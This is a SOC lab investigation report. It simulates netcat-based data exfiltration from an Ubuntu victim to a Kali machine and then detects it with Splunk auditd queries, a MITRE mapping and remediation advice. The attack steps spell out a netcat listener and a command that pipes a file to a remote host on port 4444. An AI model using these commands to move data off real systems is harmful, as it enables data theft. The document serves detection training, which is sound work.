# SOC Investigation Report — Data Exfiltration Detection
 
## Objective
 
Detect potential data exfiltration activity by identifying:
 
- Large outbound data transfers
- Suspicious command execution (nc, cat)
- Correlation between process activity and network behavior
 
---
 
## Lab Environment
 
| Component    | Details                                          |
|--------------|--------------------------------------------------|
| **SIEM**     | Splunk Enterprise                                |
| **Attacker** | Kali Linux                                       |
| **Victim**   | Ubuntu 22.04                                     |
| **Logs**     | auditd (/var/log/audit/audit.log), syslog        |
 
---
 
## Attack Overview
 
The attacker simulated data exfiltration through:
 
1. File Creation (~50MB random data)
2. Multiple Transfers using netcat
3. Outbound Connections to attacker-controlled machine
 
---
 
## Attack Execution
 
### Step 1 — File Creation (Victim)
 
```bash
dd if=/dev/urandom of=secret_data.bin bs=1M count=50
```
 
> **Screenshot 1 — File Creation** *(Upload screenshot — dd command output)*
 
---
 
### Step 2 — Attacker Listener (Kali)
 
```bash
nc -lvnp 4444 >> stolen_data.bin
```
 
> **Screenshot 2 — Listener + Connections** *(Upload screenshot — Kali multiple connections)*
 
---
 
### Step 3 — Data Exfiltration (Victim)
 
```bash
cat secret_data.bin | nc -q 1 192.168.1.64 4444
```
 
> Repeated multiple times for continuous exfiltration
 
> **Screenshot 3 — Exfiltration Command** *(Upload screenshot — Ubuntu terminal commands)*
 
---
 
### Step 4 — Proof of Exfiltration
 
```bash
ls -lh stolen_data.bin
```
 
**Output:** `150M stolen_data.bin`
 
> **Screenshot 4 — Exfiltrated File** *(Upload screenshot — 150MB file proof)*
 
---
 
## Log Analysis (Splunk)
 
### Detection Query 1 — Command Execution
 
```spl
index=main sourcetype=linux_audit "EXECVE"
| table _time host a0 a1 a2 uid
```
 
> **Screenshot 5 — Splunk EXECVE Detection** *(Upload screenshot — Splunk EXECVE table)*
 
---
 
### Detection Query 2 — Suspicious Tools
 
```spl
index=main sourcetype=linux_audit "EXECVE"
| search a0="nc" OR a0="cat"
| stats count by host, a0
```
 
---
 
### Detection Query 3 — Advanced Correlation (SOC L2)
 
```spl
index=main sourcetype=linux_audit
| transaction host maxspan=2m
| search "EXECVE"
```
 
---
 
### Key Observations from Logs
 
- `/bin/sh -c /tmp/reverse.sh` → suspicious script execution
- `nc` → network exfiltration tool
- `cat secret_data.bin` → file read before transfer
- Execution under **root** (uid=0)
 
---
 
## True Positive Report
 
**Time of Activity:** `March 28, 2026 (00:43 – 00:46)`
 
### Affected Entities
 
| Entity      | Details                          |
|-------------|----------------------------------|
| Host        | Ubuntu Server (victim)           |
| Destination | 192.168.1.64 (Kali)              |
| User        | root (uid=0)                     |
| Data Volume | ~150MB outbound transfer         |
 
### Classification Criteria
 
- Large outbound transfer (150MB)
- Suspicious `nc` tool usage
- `/tmp` script execution
- Root privilege execution
- File access → network correlation
 
> **Classification: TRUE POSITIVE**
 
---
 
## Reason for Escalation
 
| Risk Factor              | Impact Level |
|--------------------------|--------------|
| Potential data breach    | CRITICAL  |
| Unauthorized C2 comms    | HIGH      |
| Sensitive data exposure  | HIGH      |
| Root-level persistence   | CRITICAL  |
 
---
 
## MITRE ATT&CK Mapping
 
| Technique                              | ID     | Status     |
|----------------------------------------|--------|------------|
| Command and Scripting Interpreter      | T1059  | Detected |
| Exfiltration Over Alternative Protocol | T1048  | Detected |
| Exfiltration Over C2 Channel           | T1071  | Detected |
 
---
 
## Recommended Remediation
 
### 1. Network Controls
- Block outbound traffic to `192.168.1.64`
- Implement application whitelisting for `nc`
 
### 2. Host Hardening
- Monitor `/tmp` directory executions
- Restrict netcat usage via AppArmor/SELinux
 
### 3. Data Protection
- Deploy Data Loss Prevention (DLP)
- Enable file access auditing
 
### 4. Monitoring
- Alert on large outbound transfers
- Correlate process execution with network events
 
---
 
## Indicators of Compromise (IOCs)
 
### Network
- Destination IP: `192.168.1.64:4444`
- Port `4444` (netcat listener)
 
### Process
- `nc` execution (root context)
- `/tmp/reverse.sh` execution
- `cat secret_data.bin`
 
### File
- `secret_data.bin` (~50MB)
- `stolen_data.bin` (150MB)
